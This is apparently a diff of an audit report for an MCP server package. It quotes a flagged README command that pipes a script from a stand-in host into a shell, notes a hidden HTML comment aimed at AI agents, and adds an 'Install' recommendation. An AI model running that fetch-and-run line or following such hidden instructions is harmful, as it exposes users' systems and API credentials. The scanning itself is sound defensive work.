@@ -21,6 +21,14 @@
     (README:42) -> curl -fsSL https://x.example/i.sh | sh
   ! MEDIUM hidden-instructions: an HTML comment addresses an AI (README:7)
 
+-- Build or install ------------------------------------------------------------
+  What    MCP server
+  Size    30 code files, ~4,500 lines of TypeScript - 3 dependencies
+  Needs   credentials: ACME_API_KEY - network
+  Advice  Install
+  Why     Wraps the ACME API with ~4,500 lines of TypeScript: installing saves
+          you keeping up with it.
+
 -- Install ---------------------------------------------------------------------
   From the README; review before running:
     /plugin marketplace add acme/test-runner-mcp
